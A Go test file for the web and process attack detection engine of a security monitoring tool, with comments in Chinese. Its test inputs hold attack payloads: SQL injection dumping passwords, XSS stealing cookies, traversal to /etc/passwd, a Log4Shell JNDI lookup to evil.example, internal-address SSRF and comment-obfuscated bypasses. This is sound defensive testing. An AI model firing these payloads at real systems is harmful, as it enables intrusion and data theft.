package detect

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

// 同一个参数里的注入特征不因末尾追加一个只被提到的写法（<svg>、alert()）就被当成普通文字。
func TestInertProseNeedsInertMatch(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, uri := range []string{
		"/item?id=-1%20union%20select%201,password,3%20from%20users--%20%3Csvg%3E",
		"/item?id=-1%20union%20select%20table_name%20from%20information_schema.tables--%20%3Cscript%3E",
		"/item?id=-1%20union%20select%201,password,3%20from%20users--%20alert()",
	} {
		h, ok := hitIDs(e.Inspect(web("GET", uri, 200, "Mozilla/5.0")))["sqli-union"]
		if !ok || h.Weak || h.Severity < model.SevHigh {
			t.Errorf("%s: SQL 注入不应被当成普通文字: %+v", uri, h)
		}
	}
	// 脚本标签之后还有调用：会执行，不是提到标签名
	if h, ok := hitIDs(e.Inspect(web("GET", "/search?q=hello%20world%3Cscript%3Ealert()%3C/script%3E", 200, "Mozilla/5.0")))["xss-script"]; !ok || h.Weak {
		t.Errorf("<script>alert()</script> 不应被当成普通文字: %+v", h)
	}
}

// 把载荷放在两个参数 x=/* 与 y=*/ 之间：应用照常收到，检测同样要看到。
func TestPayloadInsideCommentDetected(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ uri, cat string }{
		{"/a.php?x=/*&f=../../../../etc/passwd&y=*/", CatTraversal},
		{"/api?a=/*&x=${jndi:ldap://evil.example/a}&b=*/", ""},
		{"/s?q=/*<script>alert(document.cookie)</script>*/", CatXSS},
		{"/p.php?a=/*&id=1%20union%20select%201,2,3%20from%20users&b=*/", CatSQLi},
	} {
		hits := e.Inspect(web("GET", c.uri, 200, "Mozilla/5.0"))
		found := false
		for _, h := range hits {
			if !h.TagOnly && h.Severity >= model.SevMedium && (c.cat == "" || h.Category == c.cat) {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: 注释中的载荷没有检出: %v", c.uri, ruleIDs(hits))
		}
	}
	// 注释混淆仍按去掉注释后的写法识别
	if _, ok := hitIDs(e.Inspect(web("GET", "/a?q=1+UNION/**/SELECT+1,2,3", 200, "Mozilla/5.0")))["sqli-union"]; !ok {
		t.Error("union/**/select 应命中")
	}
}

// 方法名不标准的请求行（解析器没有拆出方法，整行写在 URI 里）按其中的目标完整检测。
func TestOddMethodRequestInspected(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range []string{
		"AAAAAAAAAAAAAAAAAAAAAAAA /index.php?id=1%20union%20select%201,2,3%20from%20users--%20- HTTP/1.1",
		"get /index.php?id=1%20union%20select%201,2,3%20from%20users--%20- HTTP/1.1",
		"G3T /index.php?id=1%20union%20select%201,2,3%20from%20users--%20- HTTP/1.1",
	} {
		ids := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.9", URI: line, Status: 200, Bytes: 5120, Time: time.Now()}))
		if _, ok := ids["sqli-union"]; !ok {
			t.Errorf("%q: 应按目标检测出 SQL 注入: %v", line, keys(ids))
		}
		if _, ok := ids["proto-badmethod"]; !ok {
			t.Errorf("%q: 应另记一条非标准请求方法", line)
		}
	}
	// 真正的二进制探测、已识别的协议探测仍只记协议异常
	for _, raw := range []string{"\x16\x03\x01\x02\x00\x01\x00\x01", "SSH-2.0-Go", "\x03\x00\x00\x13\x0e\xe0 Cookie: mstshash=a"} {
		ids := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.9", URI: raw, Status: 400, Time: time.Now()}))
		if _, ok := ids["proto-nonhttp"]; !ok || len(ids) != 1 {
			t.Errorf("%q: 只应记协议异常: %v", raw, keys(ids))
		}
	}
	if _, _, ok := oddRequestLine("hello world"); ok {
		t.Error("不是请求行")
	}
}

// 重复路径段的超长 URL：每个漏洞接口签名对同一条路径只判断一次，耗时与长度成线性。
func TestVulnPathRepeatedSegmentsLinear(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, seg := range []string{"/attachment", "/reportserver", "/index.php"} {
		uri := strings.Repeat(seg, 64<<10/len(seg))
		start := time.Now()
		e.Inspect(web("GET", uri, 404, "Mozilla/5.0"))
		if d := time.Since(start); d > 300*time.Millisecond {
			t.Errorf("%s 重复到 64 KB 耗时 %v", seg, d)
		}
	}
}

func keys(m map[string]model.Hit) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// 名称本身带数字的系统工具按原名识别，不被当成版本号去掉。
func TestProcNameKeepsBuiltinDigits(t *testing.T) {
	for in, want := range map[string]string{
		`C:\Windows\System32\rundll32.exe`: "rundll32", `C:\Windows\System32\regsvr32.exe`: "regsvr32",
		"/usr/sbin/php-fpm8.2": "php-fpm", "/usr/bin/python3.11": "python", "tomcat9": "tomcat9", "procdump64.exe": "procdump",
	} {
		if got := procName(in); got != want {
			t.Errorf("procName(%q) = %q，应为 %q", in, got, want)
		}
	}
}

// 查询串里的参数分隔符不被当成不带分号的旧式实体：&notify_url= 不能变成 ¬ify_url=。
func TestEntityDoesNotEatParamBoundary(t *testing.T) {
	for in, want := range map[string]string{
		"/pay?order=1&notify_url=x&param=1&copy=2&region=3&timestamp=4": "/pay?order=1&notify_url=x&param=1&copy=2&region=3&timestamp=4",
		"/a?x=&lt;svg&gt;": "/a?x=<svg>", "/a?x=&#x3c;svg onload=1&#x3e;": "/a?x=<svg onload=1>", "/a?x=&#60script": "/a?x=<script",
		"/a?x=&amp;y": "/a?x=&y", "/a?x=a&b": "/a?x=a&b",
	} {
		if got := Normalize(in); got != want {
			t.Errorf("Normalize(%q) = %q，应为 %q", in, got, want)
		}
	}
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, uri := range []string{"/pay?order=1&notify_url=http://127.0.0.1:6379/", "/fetch?a=1&param=http://192.168.1.1/admin"} {
		if _, ok := hitIDs(e.Inspect(web("GET", uri, 200, "Mozilla/5.0")))["ssrf-internal"]; !ok {
			t.Errorf("%s 应命中内网地址 SSRF", uri)
		}
	}
}

// 一条时间错误的日志不能把突增基线衰减到 0：个别时间倒退的日志计入当前窗口，时间在未来的日志不推动窗口。
func TestSurgeBaselineSurvivesBadTimestamps(t *testing.T) {
	var s surgeBase
	win := time.Minute
	t0 := time.Now().Add(-6 * time.Hour)
	feed := func(at time.Time, n int) {
		for i := 0; i < n; i++ {
			s.roll(at, win)
			s.n++
		}
	}
	for w := 0; w < 15; w++ { // 基线成熟：每个窗口约 3 万条
		feed(t0.Add(time.Duration(w)*win), 30000)
	}
	base, windows := s.base, s.windows
	feed(t0.Add(15*win-24*time.Hour), 1)  // 一条早 24 小时的日志
	feed(time.Now().Add(24*time.Hour), 1) // 一条晚 24 小时的日志
	feed(t0.Add(15*win), 30000)
	feed(t0.Add(16*win), 30000)
	if s.base < base*0.8 || s.windows > windows+3 {
		t.Fatalf("时间错误的日志不应清空基线: base %.0f → %.0f, windows %d → %d", base, s.base, windows, s.windows)
	}
	if need := s.need(1000, 3); need < 100000 {
		t.Fatalf("繁忙服务的突增阈值应保持在平时的倍数: %d", need)
	}
	// 连续回放更早的日志：重开窗口但保留基线，跳回现在时不当作空闲窗口衰减
	for i := 0; i < 5; i++ {
		feed(t0.Add(-3*time.Hour+time.Duration(i)*time.Second), 10)
	}
	feed(t0.Add(17*win), 30000)
	if s.base < base*0.5 {
		t.Fatalf("回放结束后基线不应被当作空闲窗口衰减: %.0f", s.base)
	}
}

// 第三方告警的规则编号只接受短的字母数字，名称转义并截断。
func TestValidRuleRef(t *testing.T) {
	for in, want := range map[string]bool{"100002": true, "sysmon.1:a-b_c": true, "": false, strings.Repeat("9", 50): false, "1\n<b>": false} {
		if got := validRuleRef(in); got != want {
			t.Errorf("validRuleRef(%q) = %v，应为 %v", in, got, want)
		}
	}
}

// 请求体检测只做规则与载荷检测：普通的大表单、4 KB 的正文不报“超长URL”“超多参数绕过WAF”。
func TestBodyPassSkipsRequestLineChecks(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	var form strings.Builder
	for i := range 121 {
		fmt.Fprintf(&form, "f%d=v&", i)
	}
	for _, body := range []string{"title=" + strings.Repeat("a", 4096), form.String()} {
		ids := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: "POST", URI: "/article/save", Body: body, Status: 200, Bytes: 100, UA: "Mozilla/5.0", Time: time.Now()}))
		if _, ok := ids["proto-longurl"]; ok {
			t.Errorf("正文不应报超长URL: %v", keys(ids))
		}
		if _, ok := ids["proto-manyargs"]; ok {
			t.Errorf("表单字段多不应报超多参数: %v", keys(ids))
		}
	}
	// 正文里的注入照常检出
	if _, ok := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: "POST", URI: "/login", Body: "u=1' union select 1,2,3-- -", Status: 200, Bytes: 100, UA: "Mozilla/5.0", Time: time.Now()}))["sqli-union"]; !ok {
		t.Error("正文中的 SQL 注入应命中")
	}
}

// 系统工具连接内网的 IPv6 地址（链路本地、ULA、组播）不是连接公网。
func TestLolbinIPv6NotPublic(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for target, want := range map[string]bool{"fe80::1c2d:445": false, "fd12:3456::10:445": false, "ff02::1:3:5355": false, "10.0.0.5:445": false,
		"[2001:4860:4860::8888]:443": true, "203.0.113.7:4444": true} {
		ids := hitIDs(e.Inspect(&model.Event{Kind: model.KindProcess, Host: "pc1", Proc: &model.ProcInfo{Op: "network", Image: `C:\Windows\System32\cscript.exe`, Target: target}, Time: time.Now()}))
		if _, got := ids["proc-net-lolbin"]; got != want {
			t.Errorf("%s: 命中 %v，期望 %v", target, got, want)
		}
	}
}

// 参数个数超过分析上限时，没有分析到的参数不能被记为“语法分析判定不构成注入”。
func TestSyntaxTruncationNotNegative(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	var pad strings.Builder
	for i := range 33 {
		fmt.Fprintf(&pad, "&p%d=1", i)
	}
	uri := "/search?q=union+select+tutorial" + pad.String() + "&id=1+union+select+password+from+users+where+id=1"
	for _, h := range e.Inspect(web("GET", uri, 200, "Mozilla/5.0")) {
		if h.Category == CatSQLi && h.Syntax < 0 {
			t.Errorf("没有分析到的参数不应给出否定结论: %s syntax=%d param=%q", h.RuleID, h.Syntax, h.Param)
		}
	}
}
